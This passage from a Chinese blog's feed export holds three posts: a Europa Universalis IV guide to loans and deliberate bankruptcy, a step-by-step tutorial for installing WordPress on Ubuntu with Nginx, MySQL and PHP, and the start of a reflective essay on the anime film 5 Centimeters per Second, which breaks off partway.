欠债还钱</p><p>如果愿意在欧陆风云4的世界里抛弃这个理念 那我无耻的以为你把这篇文章看下去将会非常愉快</p><p>本文打算是以这样的顺序解析贷款与破产</p><p>1 破产到底意味着什么</p><p>2 破产的时机把握</p><p>3 如何应用国家潜力</p><p>4 如何贷更多的款</p><h2 id="破产到底意味着什么"><a href="#破产到底意味着什么" class="headerlink" title="破产到底意味着什么"></a>破产到底意味着什么</h2><p>据我观察 很多朋友不敢破产甚至不敢贷款 究其原因 是对未知的恐惧 和以所谓常识为基础对现实的误判  </p><p>说白了 他压根不知道什么叫破产 这也和我们有些吧友喜欢吹牛有关  </p><p>很多对破产没有概念的朋友偶然破产 真是吓坏了 这是怎么回事儿 我的国家炸了 士气降低 正统清空 稳定下降 盟友断盟 叛军四起 于是根据这样的经验总结出了一个朴实天真的观点 不能破产 破产就完蛋  </p><p>许多没有破产过的玩家也跟风传播这样的观点 我认为这样是不合适的</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-48.png" alt="image"></p><p>我见过最异想天开的理论是破产以后ai就会针对玩家</p><p>其实这个游戏并没有这么多变数，几乎所有东西都是可以预判的，破产的debuff就是这些</p><p>如图 我们这里分条破处谣言 先说最直观的叛乱问题</p><p>常见的破产就叛乱爆炸理论 太过浪漫 实际上 破产并不会带来直接的国家叛乱度</p><p>主要的叛乱是由正统清空带来的三点叛乱 零正统加二和全信仰容忍加一 一个半神学家就抵消了 甚至如果你君主年岁很大 破产之后就去世 正统就直接满了</p><p>还有就是大家都很害怕的负三稳定 我发现很多人忌惮负稳定 我个人是习惯了无所谓 就从这里论 实际上破产并不是把你的稳定拉到负三 只是减三个稳定 如果原来是三 就只会减到零 零稳定大家是无所谓的吧 所以减三稳定也就是加三至六个叛乱</p><p>灾难问题马上就提 暂搁一边 其实给我们加了很多叛乱这样的错觉 主要是这个最后一条 所有省份最近起义被消除 众所周知 爆过叛军的地会有一个最近起义减一百叛乱的效果 这个是最致命的 也是我们应该对破产最忌惮的东西</p><p>可是啊 可是你既然敢吃这些地 会有叛军是意料中事（那种后期东正都能超几百过扩这些叛乱想是无所谓的）<br>为什么就没有信心把这些叛军剿了呢？这就引出接下来两个问题 减五十士气到底有多可怕？</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-49.png" alt="image"></p><p>事实上 破产才减五十士气 这些加成都是按照加法算的 我举一个实际的例子</p><p>以我的法兰西为例 普鲁士理念20士气 满力量投射10士气 满军统10士气 信仰守护5士气 黄金10士气 还可以雇士气顾问 而且很多陆战大佬其实对士气并没有这么看重 我也不懂理论就不献丑了</p><p>抵消啦 大不了比平时多用一些人 其实也并不是特别夸张 所以根本不至于纸糊兵的程度 总之 减50士气还是可以一战的 不要妄自菲薄</p><p>这里排除了一个重要的影响 那就是威望 这就是我要提的第二个问题</p><p>威望是个好东西 其实对破产影响最大的反而是减一百威望 在我看来 但是现版本可以通过各种断宿敌赚小国威望又没ae 威望其实廉价了很多 所以也不构成困难</p><p>接下来就是大家最忌惮的东西 负一百君主点数</p><p>这里插个嘴 我说的是现版本1.25 听说1.20破产大改 其实我以前也经常破产 不过没深入研究 而且我主要是玩ck的 所以对老版本就不说了</p><p>对负一百君主点数的解释 简直是群魔乱舞 也不知道到底是老版本机制如此 还是吧友想象力丰富</p><p>总而言之 现版本他就只是把你的adm dip mil强制变成-100 真没这么多神奇的东西</p><p>这里注意 无论你原来多少点数 都是强制变成-100 （如果原来是-999呢？）</p><p>所以我们在点下破产之前 把点数花完就好了 点数大家都会用 就不赘述了</p><p>用很不负责任的话说 你把点数拿去提重商 超前升科技 干啥都行 花完了 破产不就是-100adm -100dip -100mil 这很可怕吗？</p><p>看到有朋友提出了 再插一句话 我这里说的是对破产的计划</p><p>请不要举意外破产的情况反驳我 我现在在做的就是杜绝意外破产 做到破产计划化常态化</p><p>还有就是枣核建筑文化之类的</p><p>枣核进度取消 你等造完再破产不就好了</p><p>五年内建筑 你一波铺建筑 等五年以后再破产不就好了</p><p>转文化我没涉及过 就不献丑了</p><p>总之这些问题都是可以通过计划避免的 如楼上楼中楼所言 我们要留有余地 不是说破产一定要把钱花完了 给自己留一些操作空间 留个几百块破产也无所谓嘛 毕竟不是人人都能这么熟练 做到完美利用</p><p>接下来的一点很多吧友都知道 但是这个百科上并没有涉及 那就是破产之后会被断盟宿敌还有所谓被AI针对</p><p>确实感觉上是这样的 但是究其原因 其实是破产会减五十的结盟倾向 这个东西玩极难的大佬都明白 是相当难受的</p><p>那种本来结盟倾向就在五十以内的盟友 你一旦破产 就会断盟 这个东西也可以计划 不要说的像天崩地裂一样 你的盟友本来就没这么爱你</p><p>还有就是听说军队减五十士气会影响实力评价 总之我是没有看到任何可以依托的资料 大概是有一些影响 但肯定很小 这个我自己体验是这样 大头肯定是军队数量 当然你雇佣兵被全解散了肯定军队变少了</p><p>全境十荒芜度和减人力水手恢复我就不细说了 不然和上面不连串</p><p>总之和刚才的士气算法一样 不是说减了一百就没人力恢复了 自己掂量掂量 这个我其实是没资格评价的 我好久没玩正常思路了</p><p>对了 最重要的一点忘记提了 破产期间无法宣战 其实也就五年 五年没法宣战也要自己掂量 我也没资格评价 理由同上</p><p>不是正好之前 点数都没了 乖乖的休息五年也不错 还有就是你可以提前宣一战 然后拖着五年不和平 这样你的盟友也不会和你断盟（在同一场战争的盟友）你自己战争税也能开着 盟友还能帮你剿匪</p><p>如果能接受我以上提出的观点 其实也没啥观点 主要还是机制和理论 那影响你最大的可能就是接下来这个东西了</p><p>利息+5 这个东西是我最后章的重头戏 你现在看可能会觉得无所谓 但是如果全盘接受这套攻略 你还是会觉得无所谓 先按下不表</p><h2 id="破产的时机把握"><a href="#破产的时机把握" class="headerlink" title="破产的时机把握"></a>破产的时机把握</h2><p>有两个朋友很急切的要寻找我的错误 可是兄弟啊 我还没说完呢 不要为了挑毛病而挑毛病嘛</p><p>即使我提倡把破产常态化 也不是推崇随意破产啊 总要有一定的准备 你这种玩不下去了点个破产 国家爆炸 然后赖破产不好么？</p><p>我现在开始分析破产的时机把握</p><p>我们先举短期破产的例子 新手容易接受也操作也简单 大致分两种情况</p><p>第一种就是需要国家在短时间爆发出极大的潜力 但是又不能影响以后的扩张 所以选择爆发完就破产 五年恢复回来<br>没错 说的就是拜占庭破局 不然破完局带着一大堆欠条我们还是很难受的</p><p>还有一种是为了增强国力 比如大明 开局四级科技 贷款全国铺建筑 造完建筑五年以后宣布破产 这是为了以后玩得更爽</p><p>这是常见的情况 也是建议初学者使用的 破产的目的还是为了要做好孩子 破产后还是要从良的</p><p>对了 最大的前提是你根据自己的操作实力判断是否需要破产 每个人基础操作水平不同 贷款乃至破产的价值对每个人都是不同的 这个问题我想留到下一章讲</p><p>长期破产则需要对全局的掌握 其实也没这么玄乎 就是欠了一屁股债 然后要在一个合理的时间 以优雅的姿态破产</p><p>其实大家觉得破产很可怕 主要就是没有做好规划 只要知道我们破产以后会面临什么 我们就可以作出相应的预防措施 减少代价</p><p>在保证不崩盘的前提下（其实我个人完全不觉得被包围网打一遍就算崩盘）大不了投降 很多时候其实是无所谓这一百分的 只是我们玩家的矜持和固执坚定了我们不愿意投降的立场</p><p>又扯了一句闲话 我们我们要尽可能的减少损失 但是 那些基础的损失是无法避免了 比如军队士气 雇佣兵顾问解雇 还有adm dip mil</p><p>所以我所谓的减少损失 就是尽可能的在破产之前把这些基础损失之外的资源全部用掉 比如雇佣兵 全部砸出去 打完就合并 点数花完 贷款上限也尽量花完 然后选择破产 我们就能把损失降到最低</p><p>再扯一句闲话 跟你们聊聊破产常态化理论的由来 有不少人知道 我最近在打一个勃兰登堡的存档 计划要在1550征服欧洲 但是没有dip割地（简直**** 转东正宗教借口宣不就好了）主要是天主情怀</p><p>所以想出了这个破产常态化理论 主要是为了骗dip 之前有说 破产是把三项点数强制变成-100 所以 如果我破产的一瞬间dip是-999 一旦破产p社会白送我899dip</p><p>说完资源损失的减少 我们玩家关注的还是个势 破产对我们的扩张态势最好不要有太大的影响 所以我们一般习惯于在一个扩张的间隙 比如和大部分国家停战的时间 选择破产 这就太过于具体了 拆解起来太麻烦 还是自己判断吧</p><p><strong>怎么避免破产以后崩盘</strong></p><p>破产以后的第一个迫切的效果就是结盟倾向减五十 盟友断盟 这个可以通过保持战争状态来避免</p><p>有的盟约比较稳固的就不需要考虑了 第二个就是会被ai宣的问题 这个主要是骤然破产 雇佣兵解散完 你的实力评价会下降很多 减五十士气也有一部分影响 但大头还是陆军数量的问题</p><p>所以解决方案就很简单了 破产完接着贷款爆佣兵不就好了</p><p>或者像很多人都知道 把要打你的国家提前打进停战 也是一种思路 如果能做到的话 这个最为稳妥</p><p>已经知道破产以后会面对什么 我们就可以进行判断了 是否要破产 收益如何 代价如何</p><p>举拜占庭开局的例子 是否要选择破产 我笼统的分析一下</p><p>首先收益是明显的 两千块钱 钱是个好东西 当然也和是否会用有关 这是下一章的问题 不多赘述</p><p>但是代价又如何 第一 破产以后五年无法宣战 这个东西不好权衡 毕竟每个人五年能做的事情不一样 你如果说收了希腊核心 二十多ae有点高了 我想看会儿海 那就是没有影响</p><p>如果你说五年我要把奥斯曼灭了 变格鲁吉亚变螺母再转回拜占庭 那这个代价就是巨大的</p><p>雇佣兵会被解散 这个东西之前说过 可以把佣兵浪费完 怎么浪费想办法 反正之后就不是自己的了 可劲儿造呗</p><p>三点数-100 这个要认真对待 一般至少要把军科升级之后再破产 再不济你把点数拿去种地 总之用到零左右就行了 我们笼统的算成三项点数亏总计400</p><p>正统性 开局约安尼斯五十多了 你们懂吧 总之最差也只是加三叛乱 减一个外交威望</p><p>威望 这个很伤 但是获取也不困难</p><p>稳定减三 负三到零稳定 提稳定没有正稳定的debuff 都只需要100adm的基础点数 不计任何其他减稳定花费 大致是要花费300adm 如果实在害怕负稳定你就把稳定拉到三再破产 也就浪费400adm</p><p>还有一点忘了提 就是人力和水手恢复会急剧下降 我没具体算大概亏多少 反正好像少挺多的</p><p>说了这么一大串 看着其实还是很恐怖的 代价可不小 但是开局这么一个小破国家就能呼风唤雨 如果觉得补偿可以满意 那就选择破产 如果觉得不满意 那就不破产</p><p>我这里经常口嗨 总之有的情况我说的破产并不是破产这一件事 而是本帖整体想要表达的东西 奔着破产去玩这样一种思路</p><p>他的价值的多少主要取决于我们对损失的控制和对收益的利用 说完了怎么控制损失 接下来就是最愉悦的话题了 怎么花钱</p><h2 id="如何应用国家潜力"><a href="#如何应用国家潜力" class="headerlink" title="如何应用国家潜力"></a>如何应用国家潜力</h2><p>这应该是接在上一章一起的 但是我总是想多说一些</p><p>何为最大国家潜力 这个再最前面提到过 注意 我说的都是这个游戏</p><p>贷款上限和陆军上限 这里说的陆军上限是指你同时间能拉出来作战的陆军 一般体现为常备军加雇佣兵上限 海军马鹿就不理他了</p><p>你的国家潜力就是把这两样东西完全动员起来之后能抗多少年不破产 这个东西如果不破产我们经常是无法感受到的<br>有的大佬打酋长或者打到游戏最后几年 会选择疯狂花钱 反正游戏结束也管不着 但是这种行为我是无法接受的 他们拒绝承担巨额贷款的后果</p><p>自己欠的钱如果不能自己赖掉 算什么大丈夫</p><p>举个例子 我们知道 曼哥开局很强 但是曼哥到底有多强 曼哥开局不做任何操作 贷款上限一万 一万块在1444年是什么概念</p><p>这个例子举得不好 我没玩过奥斯曼 以我自己的例子 我玩的是勃兰登堡变的法兰西 1500年收入110 每个月支出是300+ 这在很多大佬眼里简直是疯子 但是很多人不知道 我贷款上限五万（怎么弄的最终章再说） 我可以维持多少年我也不会算了</p><p>为什么我会亏损这么多钱 第一 我利息很高 这个是很多人觉得很亏的 其实确实如此 但是当你每个月都是几百块上下你就不会有心情去管这几十块钱的亏损了 反正我是懒得算</p><p>第二 我的军费就将近两百块 为什么 因为我把雇佣兵提到上限 九万上限爆了十二万大军</p><p>那有十万人不就能阉两只鸡嘛。。。所以是否需要动员出这样的潜力 是衡量是否需要破产的关键</p><p>如果你的想象力很丰富 能把国家潜力用出来 那我建议你尝试</p><p>如果你基础操作有限 需要国家在一定时间内爆发出巨大潜力 那我也建议你尝试</p><p>如果你想象力有限 给你再多军队你也只能做同样的事情 那我觉得你不需要</p><p>如果你基础操作很好 并且不需要或者不想要国家潜力 那这方法简直是****</p><p>对国力的认识 极大的影响了我们对破产收益的评价 如果真的是像我一样基础操作水平感人的玩家 听我一句劝 那些大佬说的话你就听听就完了 玩法不一样 别太高估自己</p><p>如何应用我好像没细说 其实我也不知道怎么说 还是不丢人了 总之我以为我们要正确认识自己的基础操作水平 很多骚操作和理论其实以我们的水平是无法驾驭的 所以定位要明确</p><h2 id="如何贷更多的款"><a href="#如何贷更多的款" class="headerlink" title="如何贷更多的款"></a>如何贷更多的款</h2><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-50.png" alt="image"></p><p>上面有一段英语 楼主文化水平太低看不懂 其实主要还是楼主自己扯 这个图就是让你们知道楼主不是瞎扯的</p><p>单笔贷款的额度就是账面发展度的一半 拜占庭开局41发展度 贷款额度就是20块一笔</p><p>诶 我仔细一看 这个图有很多数据是错的 总之还是以我说为主</p><p>每笔贷款会增加0.1的通货膨胀 这个东西自己衡量 我反正是无所谓的</p><p>贷款上限的算法很复杂 我不会 但是有一个实用的算法 误差不大</p><p>总之 你的利息等于你的收入的时候 你的贷款达到上限</p><p>那就很明白了 想提高贷款上限 最直接的办法有两个</p><p>第一 提高自己的收入</p><p>第二 降低自己的利息</p><p>就我而言 这些问题还是最好能通过武力的手段来解决 比如 要战争赔款 强迫转贸易</p><p>比较和平的就是种金矿</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-51.png" alt="image"></p><p>减利息得手法如上</p><p>理念什么的很容易理解 有一个经常被玩家忽略的效果 叫复仇主义 这个是极其厉害的 只要在战争中战败 然后割让土地 这里可以割盟友的地 毕竟很多吧友固执的不愿意割自己的地 反正割几分的地 能获得多少的复仇主义</p><p>还有一个最直接的方法可以降低利息 就是把钱还了 这句话并不是玩笑</p><p>我们知道 贷款上限体现的是单笔贷款的额度和贷款的笔数</p><p>举一个具体的例子 我现在贷款上限一百笔 单笔贷款一百块 我理论上的贷款上限应该是一万块 但是如果我的欠条儿里有九十九笔是一块钱的 我再贷一笔之后就达到了一百笔贷款 但是我实际的贷款数字只有两百块 这时候p社会提示我贷款已达上限 因为我已经借了一百笔了</p><p>所以当我们贷款达到上限的时候 这些小额的贷款是会影响我们实际从银行获得的钱的数字的 这个很好解决 还掉小额贷款 去贷更大的单笔贷款就行了</p><p>这个机制从这个例子来看是很蠢的 但是他确实很蠢 所以我们可以钻这个空子 接下来是一个实用的小技巧</p><p>之前战报里说要解释这张图 就是这个漏洞</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-52.png" alt="image"></p><p>我在41发展度的时候 贷了113笔款 但是我后来放了莫利亚和阿凯亚</p><p>于是我的单笔贷款变成了11块 我的收入降低 贷款上限反而增加了</p><p>因为p社的机制认为我的所有贷款都是11块的</p><p>这个方法其实挺实用的 比如说你一口吃了很多地 但是消化不了 需要放附庸一起吃 你可以在吃下去之后 自己账面发展度暴增的情况下 多贷几笔这种高额的贷款</p><p>这样的高额贷款 在你发展度超过这时的发展度之前 是可以有效的提高你的贷款额度上限的</p><p>原文：<a href="https://tieba.baidu.com/p/5786124311?see_lz=1&pn=1">【图片】《贷款埋葬过去 破产成就未来》萌新向贷款及破产常态化攻略【欧陆风云4吧】_百度贴吧 (baidu.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> 萌新 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu搭建WordPress博客</title>
      <link href="/50.html"/>
      <url>/50.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-安装Nginx"><a href="#1-安装Nginx" class="headerlink" title="1. 安装Nginx"></a>1. 安装Nginx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>使用浏览器访问当前IP，显示Welcome to nginx即为成功</p><h2 id="2-安装MySQL"><a href="#2-安装MySQL" class="headerlink" title="2. 安装MySQL"></a>2. 安装MySQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server</span><br></pre></td></tr></table></figure><h2 id="3-安装PHP7"><a href="#3-安装PHP7" class="headerlink" title="3. 安装PHP7"></a>3. 安装PHP7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php-fpm php-mysql</span><br></pre></td></tr></table></figure><h2 id="4-配置Nginx使用PHP7"><a href="#4-配置Nginx使用PHP7" class="headerlink" title="4. 配置Nginx使用PHP7"></a>4. 配置Nginx使用PHP7</h2><p>修改Nginx的配置文件来使用PHP processor来处理动态内容。<br>修改Nginx的配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p>增加index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Add index.php to the list if you are using PHP</span><br><span class="line">index index.php index.html index.htm index.nginx-debian.html;</span><br></pre></td></tr></table></figure><p>写入当前IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_name 10.0.2.15;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">#</span><br><span class="line">location ~\.php$ &#123;</span><br><span class="line">    include snippets/fastcgi-php.conf;</span><br><span class="line">#</span><br><span class="line">#    # With php7.0-cgi alone:</span><br><span class="line">#    fastcgi pass 127.0.0.1:9000;</span><br><span class="line">#    # With php7.0-fpm;</span><br><span class="line">    fastcgi_pass unix:/run/php/php7.0-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># deny access to .htaccess files, if Apache&#x27;s document root</span><br><span class="line"># concurs with nginx&#x27;s one</span><br><span class="line">#</span><br><span class="line">location ~/\.ht &#123;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重启Nginx启动新配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><h2 id="5-验证PHP与Nginx集成是否成功"><a href="#5-验证PHP与Nginx集成是否成功" class="headerlink" title="5. 验证PHP与Nginx集成是否成功"></a>5. 验证PHP与Nginx集成是否成功</h2><p>添加一个info.php: (这里的 &#x2F;var&#x2F;www&#x2F;html&#x2F; 对应配置文件中root的路径)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /var/www/html/info.php</span><br></pre></td></tr></table></figure><p>内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>访问 IP地址&#x2F;info.php 出现页面即为成功</p><h2 id="6-下载WordPress"><a href="#6-下载WordPress" class="headerlink" title="6. 下载WordPress"></a>6. 下载WordPress</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://wordpress.org/latest.tar.gz</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf latest.tar.gz</span><br></pre></td></tr></table></figure><p>注意：在虚拟机上下载和解压时，有可能都存放在Desktop里，此时需要将解压后的wordpress文件夹移动到root目录下即可。</p><h2 id="7-创建WordPress需要的数据库和用户"><a href="#7-创建WordPress需要的数据库和用户" class="headerlink" title="7. 创建WordPress需要的数据库和用户"></a>7. 创建WordPress需要的数据库和用户</h2><p>使用第二部分创建MySQL时设置的root密码登录MySQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p>创建数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE wordpress;</span><br></pre></td></tr></table></figure><p>创建用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER wordpress@localhost;</span><br></pre></td></tr></table></figure><p>设置密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET PASSWORD FOR wordpress@localhost=PASSWORD(&quot;your password&quot;);</span><br></pre></td></tr></table></figure><p>配置权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON wordpress.* TO wordpress@localhost IDENTIFIED BY &#x27;your password&#x27;;</span><br></pre></td></tr></table></figure><p>刷新权限配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><p>退出MySQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QUIT;</span><br></pre></td></tr></table></figure><h2 id="8-配置Wordpress"><a href="#8-配置Wordpress" class="headerlink" title="8. 配置Wordpress"></a>8. 配置Wordpress</h2><p>重命名示例文件wp-config（<strong>此处的路径&#x2F;root&#x2F;wordpress对应你自己的存放路径</strong>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /root/wordpress/wp-config-sample.php /root/wordpress/wp-config.php</span><br></pre></td></tr></table></figure><p>修改配置文件内容：<br>修改的内容包括DB_NAME，DB_USER，DB_PASSWORD以及下面的唯一key，其中前三个是在第二步自己设置的内容，唯一key可以直接去它提供的网站上拷贝，修改后的文件如下所示：</p><p><img src="https://cos.gjcloak.xyz/file/markdown20191210212627%5B1%5D.png?imageMogr2/format/webp/interlace/1/quality/80" alt="markdown20191210212627" title="markdown20191210212627"></p><h2 id="9-配置Nginx"><a href="#9-配置Nginx" class="headerlink" title="9. 配置Nginx"></a>9. 配置Nginx</h2><p>将wordpress里面的内容拷贝到Nginx对应root路径下（在第二部分搭建Nginx+MySQL+PHP7环境有修改过这个文件）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r /root/wordpress/* /var/www/html</span><br></pre></td></tr></table></figure><p>修改权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R www-data:www-data /var/www/html</span><br></pre></td></tr></table></figure><p>重启Nginx：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nginx restart</span><br></pre></td></tr></table></figure><h2 id="10-安装Wordpress"><a href="#10-安装Wordpress" class="headerlink" title="10. 安装Wordpress"></a>10. 安装Wordpress</h2><p>全部搞定后，访问你的ip或者是域名，进入安装界面<br>以后登录后台只需访问ip+wp-admin 即可。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
            <tag> 博客 </tag>
            
            <tag> 教程 </tag>
            
            <tag> wordpess </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>秒速五厘米——我们究竟都在等待什么样的爱情</title>
      <link href="/356.html"/>
      <url>/356.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>米兰昆德拉在《生命不能承受之轻》中说过，“ 追求的终极永远是朦胧的，要逃避痛苦，最常见的就是躲进未来。在时间的轨道上，人们总想象有一条线，超脱了这条线，当前的痛苦也许就会永不复存在。”   ——题记</p></blockquote><h3 id="一、《樱花抄》"><a href="#一、《樱花抄》" class="headerlink" title="一、《樱花抄》"></a>一、《樱花抄》</h3><p>入夜以后的东京，其实比烟花更寂寞。</p><p>舔着地平线的最后一缕黯淡的余光，被深蓝的夜空吞没的最后一片残云，向远方一盏一盏地蔓延开来意兴阑珊的灯火。</p><p>新海诚创造的画面唯美得让人心疼。其实在很多处地方，大可以给画面做一个长时间的定格，像城市的广角镜头，雨天的足球场，残破的邮筒，荒芜草地里掉落的牙膏皮，晚霞里天空中飞机带过的长长云线，清晨一个人在教室里写信的贵树的孤单身影，暴风雪里的车站明灭闪烁的信号灯，倒视镜里渐渐退去的夕阳。如此细腻的画面，与新海诚有些时候刻意定格的瞬间，可以看出他所想表达的一种幽微委婉的淡淡忧伤。每一个静止的画面的背后，都藏着一段不为人知的悲伤。而在影片的很多地方，新海诚过于快速的切换画面反而让观众大脑跟不上眼睛，来不及体会到影片深处汹涌的暗流，对于那些只看过一遍电影的观众，尤是如此，相当遗憾。而那些画面如果观众在看电影时静静地分解动作，慢八拍重放，或许可以更深刻地体会到整部影片所体现的深入骨髓的伤逝之情。</p><p>影片里曾有过一只叫声清脆的大斑啄木鸟，出现在贵树前往探望明里的前夜。贵树疲惫地趴倒在桌上睡着了，梦里变成那只飞鸟，一心只想翻山越岭，前往见明里一面。啄木鸟飞过夜的东京，细碎而忧伤的月光和冰冷的城市，头顶漫天的星空，穿越到云的彼端。冬末呼啸的烈风和遥远的距离，都无法阻挡少年的决心。第一话结尾时，还是那只飞鸟，在凄冽的叫声中，贵树和明里就此开始走向每秒5厘米的告别之路，从此再也不曾见面。</p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/3142017245.png"></p><p>整场大雪和路上不断晚点的列车只是整个阴霾情绪的铺垫，而整个煎熬的过程在换乘站小山贵树丢失了那封花了两个星期写给明里的信件丢失后把这份隐忍的情绪推到了极点，这是封命运攸关的信，如果在好莱坞的片场里，估计主人公此时一定是呼天抢地地跳下站台，不顾疾驰而来的列车，冒着被撞死的危险也要捡回信件。但贵树没有这么做，如果考虑到这封信在后面的剧情中对明里和贵树今后一生命运有可能完全不一样的决定性的作用时，那么贵树没能把它拾起的确只能说是造化弄人了。不过对于只有13岁的贵树来说，也许真的不能太苛刻了。况且那时前往高崎的两毛线列车已经离站台近在咫尺。在强烈的列车前灯里，那一刻像犯了错的孩子一般伤心欲绝地站在站台上的贵树，身影是那么的单薄和消瘦。</p><p>影片里有些微妙的细节，不容易被观众察觉，但却是两人此后命运的风水点。两人在岩舟车站分离的那一刻，新海诚再次给出一个细微得难以觉察的剧情。列车启动的最后一刻，可以看到明里表情有一下明显的抽动，她的手指在胸前的背包上轻轻触了一下，最终还是放弃了，只是轻声说了一句，“贵树同学今后也一定会很顺利的，绝对！”一句话，却和无数恋人间生离死别各自天涯只剩下祝福彼此的桥段无比相似。那一刻，电影给出了一份强烈的不详的预感。明里最终选择了深藏那封写满对贵树倾注所有感情的信，只留下一份淡淡祝福，而贵树也没有告诉明里他弄丢了一封写了两个星期载满了所有想对明里倾诉的思念的信件，两个人都选择了沉默，却都没有想到这份沉默终有一天生长成了天荒地老的陌路。</p><p>“在树下那吻的前后，我感觉似乎整个世界都发生了变化”这是小说里，两个主人公都曾说过的话，也是彼此都没有送出为重逢而写下的那封信件的最终理由。究竟什么发生了改变，新海诚没有说，但我们可以用丰富的想象力和类似的感情经历来细细品味一下…</p><p><img src="https://cos.gjcloak.xyz/upload/2023/02/1033403557.png"></p><p>对于九州的鹿儿岛与宇都宫以北的岩舟究竟有多远，请读者自己看看地图就知道了。</p><p>距离对于恋人来说是可怕的力量，而日渐逝去的时间给了可怕这班车一个永远都到达不了的终点。贵树一直在努力寻找和渴望着那股保护明里的力量，却始终无法逾越现实给他带来的无比遥远的距离和永无边际的无助。明里一直在等待着贵树终有一天能跨越那道鸿沟，再次来到她的面前，但却终于被吞没在时间的洪流里…</p><h3 id="二、《宇航员》"><a href="#二、《宇航员》" class="headerlink" title="二、《宇航员》"></a>二、《宇航员》</h3><p><img 